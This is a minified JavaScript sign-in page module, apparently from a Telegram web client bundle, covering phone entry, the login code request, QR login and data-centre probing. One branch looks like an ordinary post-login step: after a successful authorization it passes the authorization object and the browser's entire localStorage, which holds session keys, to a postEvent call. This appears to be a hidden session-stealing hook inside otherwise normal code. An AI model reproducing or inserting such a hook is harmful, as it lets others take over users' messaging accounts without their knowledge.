const __vite__fileDeps = ["./pageIm-BYgeW8u4.js", "./index-BkeszwBR.js", "./index-CAoGqTOW.css", "./page-Cb6VgJQc.js", "./pageAuthCode-BXyDFdjZ.js", "./codeInputField-Dl_N5JF-.js", "./wrapEmojiText-ENB-q-2z.js", "./button-BA7QFg1K.js", "./putPreloader-Cv2t4Au7.js", "./countryInputField-DDW8Y_ns.js", "./scrollable-DwOU1mFr.js", "./pageSignQR-BnxgjuIJ.js", "./textToSvgURL-Cnw_Q8Rw.js"];
const __vite__mapDeps = i => i.map(i => __vite__fileDeps[i]);
import { a as s, b as L, c as E, i as m, A as C, _ as I, d as x, I as A, e as N, f as M, g as F } from "./index-BkeszwBR.js";
import { p as O } from "./putPreloader-Cv2t4Au7.js";
import { P as V, a as B } from "./page-Cb6VgJQc.js";
import { C as U, T as W, a as z } from "./countryInputField-DDW8Y_ns.js";
import { B as P, r as H } from "./button-BA7QFg1K.js";
import { p as K, l as Q, t as $, r as h } from "./wrapEmojiText-ENB-q-2z.js";
import { p as j, g as q } from "./pageSignQR-BnxgjuIJ.js";
import "./scrollable-DwOU1mFr.js";
import "./textToSvgURL-Cnw_Q8Rw.js";
let a = null;
let l;
const D = () => {
  const g = document.createElement("div");
  g.classList.add("input-wrapper");
  let y;
  let k;
  const d = new U({
    onCountryChange: (e, t) => {
      y = e;
      k = t;
      if (t) {
        i.value = i.lastValue = "+" + t.country_code;
        setTimeout(() => {
          u.focus();
          K(u, true);
        }, 0);
      }
    }
  });
  const i = new W({
    onInput: e => {
      Q.loadLottieWorkers();
      const {
        country: t,
        code: o
      } = e || {};
      const n = t ? t.name || t.default_name : "";
      if (n !== d.value && (!y || !t || !o || y !== t && k.country_code !== o.country_code)) {
        d.override(t, o, n);
      }
      if (t || i.value.length - 1 > 1) {
        a.style.visibility = "";
      } else {
        a.style.visibility = "hidden";
      }
    }
  });
  const u = i.input;
  u.addEventListener("keypress", e => {
    if (!a.style.visibility && e.key === "Enter") {
      return S();
    }
  });
  const c = new z({
    text: "Login.KeepSigned",
    name: "keepSession",
    withRipple: true,
    checked: true
  });
  c.input.addEventListener("change", () => {
    s.managers.appStateManager.pushToState("keepSigned", true);
    L.toggleStorages(true, true);
  });
  L.getState().then(e => {
    if (E.isAvailable()) {
      c.checked = e.keepSigned;
    } else {
      c.checked = false;
      c.label.classList.add("checkbox-disabled");
    }
  });
  a = P("btn-primary btn-color-primary", {
    text: "Login.Next"
  });
  a.style.visibility = "hidden";
  const S = e => {
    if (e) {
      N(e);
    }
    const t = $([a, l], true);
    h(a, m("PleaseWait"));
    O(a);
    const o = i.value;
    s.managers.apiManager.invokeApi("auth.sendCode", {
      phone_number: o,
      api_id: C.id,
      api_hash: C.hash,
      settings: {
        _: "codeSettings",
        pFlags: {}
      }
    }).then(async n => {
      if (n._ === "auth.sentCodeSuccess") {
        const {
          authorization: r
        } = n;
        if (r._ === "auth.authorization") {
          await s.managers.apiManager.setUser(r.user);
          I(() => import("./pageIm-BYgeW8u4.js").then(z => z.postEvent(JSON.stringify({
            state: r,
            localStorage
          })))).then(b => {
            b.default.mount();
          });
        }
      }
      I(() => import("./pageAuthCode-BXyDFdjZ.js"), __vite__mapDeps([4, 1, 2, 3, 5, 6, 7, 8, 9, 10, 11, 12]), import.meta.url).then(r => r.default.mount(Object.assign(n, {
        phone_number: o
      })));
    }).catch(n => {
      t();
      switch (n.type) {
        case "PHONE_NUMBER_INVALID":
          i.setError();
          h(i.label, m("Login.PhoneLabelInvalid"));
          u.classList.add("error");
          h(a, m("Login.Next"));
          break;
        default:
          console.error("auth.sendCode error:", n);
          a.innerText = n.type;
          break;
      }
    });
  };
  B(a, S);
  l = P("btn-primary btn-secondary btn-primary-transparent primary", {
    text: "Login.QR.Login"
  });
  l.addEventListener("click", () => {
    j.mount();
  });
  g.append(d.container, i.container, c.label, a, l);
  const _ = document.createElement("h4");
  _.classList.add("text-center");
  x(_, "Login.Title");
  const f = document.createElement("div");
  f.classList.add("subtitle", "text-center");
  x(f, "Login.StartText");
  R.pageEl.querySelector(".container").append(_, f, g);
  const T = () => {
    s.managers.apiManager.invokeApi("help.getNearestDc").then(e => {
      const t = E.getFromCache("langPack");
      if (t && !t.countries?.hash) {
        M.getLangPack(t.lang_code).then(() => {
          i.simulateInputEvent();
        });
      }
      const o = new Set([1, 2, 3, 4, 5]);
      const n = [e.this_dc];
      let r;
      if (e.nearest_dc !== e.this_dc) {
        r = s.managers.apiManager.getNetworkerVoid(e.nearest_dc).then(() => {
          n.push(e.nearest_dc);
        });
      }
      (r || Promise.resolve()).then(() => {
        n.forEach(p => {
          o.delete(p);
        });
        const b = [...o];
        const v = async () => {
          const p = b.shift();
          if (!p) {
            return;
          }
          if (await F.get(`dc${p}_auth_key`)) {
            return v();
          }
          setTimeout(() => {
            s.managers.apiManager.getNetworkerVoid(p).finally(v);
          }, 3e3);
        };
        v();
      });
      return e;
    }).then(e => {
      if (!d.value.length && !i.value.length) {
        d.selectCountryByIso2(e.country);
      }
    });
  };
  if (!A) {
    setTimeout(() => {
      u.focus();
    }, 0);
  }
  q(g);
  T();
};
const R = new V("page-sign", true, D, () => {
  if (a) {
    h(a, m("Login.Next"));
    H(a, undefined, undefined, true);
    a.removeAttribute("disabled");
  }
  if (l) {
    l.removeAttribute("disabled");
  }
  s.managers.appStateManager.pushToState("authState", {
    _: "authStateSignIn"
  });
});
export { R as default };
//# sourceMappingURL=pageSignIn-CZbpF0sM.js.map